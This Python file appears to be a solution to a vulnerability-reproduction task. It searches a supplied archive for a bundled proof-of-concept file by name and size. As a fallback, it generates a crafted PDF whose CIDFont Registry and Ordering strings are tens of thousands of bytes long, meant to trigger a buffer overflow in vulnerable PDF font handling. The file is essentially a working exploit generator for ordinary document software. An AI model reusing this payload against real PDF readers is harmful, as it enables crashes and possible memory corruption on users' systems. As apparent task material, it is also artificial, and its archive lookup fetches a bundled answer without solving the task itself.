import os
import io
import tarfile
import zipfile


TARGET_POC_LEN = 80064


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Try to locate a PoC input inside the provided archive. Prefer exact length matches.
        data = self._extract_poc_from_archive(src_path)
        if data is not None:
            return data
        # Fallback: generate a generic PDF intended to tickle the CIDFont fallback path
        return self._generate_fallback_pdf()

    def _extract_poc_from_archive(self, path: str) -> bytes | None:
        if not path or not os.path.exists(path):
            return None

        # Try tar archive (supports gz/bz2/xz with r:*)
        try:
            with tarfile.open(path, mode="r:*") as tf:
                exact_pdf_member = None
                exact_any_member = None
                keyword_pdf_members = []
                keyword_any_members = []
                pdf_members = []

                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name_lower = m.name.lower()
                    is_pdf = name_lower.endswith(".pdf")
                    has_keyword = any(k in name_lower for k in (
                        "poc", "proof", "cid", "cidfont", "crash", "overflow",
                        "testcase", "trigger", "sample", "repro", "input", "regress"
                    ))

                    if m.size == TARGET_POC_LEN:
                        if is_pdf and exact_pdf_member is None:
                            exact_pdf_member = m
                        if exact_any_member is None:
                            exact_any_member = m
                    else:
                        if has_keyword:
                            if is_pdf:
                                keyword_pdf_members.append(m)
                            else:
                                keyword_any_members.append(m)
                        elif is_pdf:
                            pdf_members.append(m)

                # Choose in order of confidence
                member = exact_pdf_member or exact_any_member
                if member is None:
                    # Prefer keyword .pdf, then keyword any, then any .pdf (largest)
                    if keyword_pdf_members:
                        # Pick largest among keyword_pdf_members
                        member = max(keyword_pdf_members, key=lambda mm: mm.size)
                    elif keyword_any_members:
                        member = max(keyword_any_members, key=lambda mm: mm.size)
                    elif pdf_members:
                        member = max(pdf_members, key=lambda mm: mm.size)

                if member is not None:
                    f = tf.extractfile(member)
                    if f:
                        return f.read()
        except tarfile.TarError:
            pass
        except Exception:
            pass

        # Try zip archive
        try:
            with zipfile.ZipFile(path, mode="r") as zf:
                infos = zf.infolist()
                exact_pdf_info = None
                exact_any_info = None
                keyword_pdf_infos = []
                keyword_any_infos = []
                pdf_infos = []

                for info in infos:
                    if info.is_dir():
                        continue
                    name_lower = info.filename.lower()
                    is_pdf = name_lower.endswith(".pdf")
                    has_keyword = any(k in name_lower for k in (
                        "poc", "proof", "cid", "cidfont", "crash", "overflow",
                        "testcase", "trigger", "sample", "repro", "input", "regress"
                    ))
                    size = info.file_size

                    if size == TARGET_POC_LEN:
                        if is_pdf and exact_pdf_info is None:
                            exact_pdf_info = info
                        if exact_any_info is None:
                            exact_any_info = info
                    else:
                        if has_keyword:
                            if is_pdf:
                                keyword_pdf_infos.append(info)
                            else:
                                keyword_any_infos.append(info)
                        elif is_pdf:
                            pdf_infos.append(info)

                info = exact_pdf_info or exact_any_info
                if info is None:
                    if keyword_pdf_infos:
                        info = max(keyword_pdf_infos, key=lambda ii: ii.file_size)
                    elif keyword_any_infos:
                        info = max(keyword_any_infos, key=lambda ii: ii.file_size)
                    elif pdf_infos:
                        info = max(pdf_infos, key=lambda ii: ii.file_size)

                if info is not None:
                    with zf.open(info, "r") as f:
                        return f.read()
        except zipfile.BadZipFile:
            pass
        except Exception:
            pass

        return None

    def _generate_fallback_pdf(self) -> bytes:
        # Generate a minimal PDF with a Type0 font referencing a CIDFont that has extremely
        # long Registry and Ordering strings in the CIDSystemInfo dictionary. This aims to
        # trigger fallback name creation "<Registry>-<Ordering>" in vulnerable implementations.
        # Build objects
        def pdf_obj(obj_num: int, content: bytes) -> bytes:
            return f"{obj_num} 0 obj\n".encode("ascii") + content + b"\nendobj\n"

        header = b"%PDF-1.7\n%\xFF\xFF\xFF\xFF\n"

        # Long strings for Registry and Ordering
        # Use safe ASCII characters to avoid needing escapes.
        registry = b"A" * 50000  # 50k
        ordering = b"B" * 20000  # 20k

        cid_system_info = b"<< /Registry (" + registry + b") /Ordering (" + ordering + b") /Supplement 0 >>"
        # FontDescriptor: minimal viable
        font_descriptor = (
            b"<< /Type /FontDescriptor /FontName /AAAA /Flags 4 "
            b"/FontBBox [0 0 0 0] /ItalicAngle 0 /Ascent 1000 /Descent -200 /CapHeight 700 /StemV 80 >>"
        )
        # CIDFont dictionary referencing CIDSystemInfo with long strings
        cid_font = (
            b"<< /Type /Font /Subtype /CIDFontType2 /BaseFont /AAAA "
            b"/CIDSystemInfo 7 0 R /FontDescriptor 8 0 R /DW 1000 /W [0 [500 ]] /CIDToGIDMap /Identity >>"
        )
        # Type0 font
        type0_font = (
            b"<< /Type /Font /Subtype /Type0 /BaseFont /AAAA /Encoding /Identity-H "
            b"/DescendantFonts [6 0 R] >>"
        )
        # Content stream that uses the font
        content_stream_data = b"BT /F1 12 Tf 100 700 Td (Hello) Tj ET\n"
        content_stream_dict = b"<< /Length " + str(len(content_stream_data)).encode("ascii") + b" >>"
        content_stream = content_stream_dict + b"\nstream\n" + content_stream_data + b"endstream"

        # Page resources
        page = (
            b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
            b"/Resources << /Font << /F1 4 0 R >> >> /Contents 5 0 R >>"
        )
        # Pages
        pages = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"
        # Catalog
        catalog = b"<< /Type /Catalog /Pages 2 0 R >>"

        # Assemble objects with their numbers
        # 1: Catalog, 2: Pages, 3: Page, 4: Type0 font, 5: Content stream,
        # 6: CIDFont, 7: CIDSystemInfo, 8: FontDescriptor
        objs = [
            pdf_obj(1, catalog),
            pdf_obj(2, pages),
            pdf_obj(3, page),
            pdf_obj(4, type0_font),
            pdf_obj(5, content_stream),
            pdf_obj(6, cid_font),
            pdf_obj(7, cid_system_info),
            pdf_obj(8, font_descriptor),
        ]

        # Build file and xref
        offsets = []
        out = io.BytesIO()
        out.write(header)
        # Record offset for object numbering starting after header
        for obj_bytes in objs:
            offsets.append(out.tell())
            out.write(obj_bytes)

        xref_offset = out.tell()
        # Build xref table
        # xref entries: include object 0 free entry
        # We'll write a simple xref subsection for objects 0..8
        xref = io.BytesIO()
        xref.write(b"xref\n")
        xref.write(b"0 9\n")
        # object 0 free entry
        xref.write(b"0000000000 65535 f \n")
        # objects 1..8
        for off in offsets:
            xref.write(("{:010d} 00000 n \n".format(off)).encode("ascii"))

        out.write(xref.getvalue())

        # Trailer
        trailer = (
            b"trailer\n<< /Size 9 /Root 1 0 R >>\nstartxref\n" +
            str(xref_offset).encode("ascii") + b"\n%%EOF\n"
        )
        out.write(trailer)

        return out.getvalue()
